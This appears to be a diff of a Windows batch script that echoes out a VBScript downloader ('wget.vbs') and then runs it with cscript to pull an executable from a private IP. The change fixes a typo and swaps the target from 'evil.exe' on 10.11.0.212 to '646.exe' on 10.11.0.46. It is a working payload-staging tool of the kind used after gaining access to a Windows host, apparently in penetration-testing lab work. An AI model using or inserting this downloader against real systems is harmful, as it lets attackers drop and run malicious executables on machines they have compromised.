@@ -1,5 +1,5 @@
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
-echo StrFile = WScritpe.Arguments.Item(1) >> wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
@@ -23,4 +23,4 @@ echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
 echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
-cscript wget.vbs http://10.11.0.212/evil.exe evil.exe
+cscript wget.vbs http://10.11.0.46/646.exe 646.exe
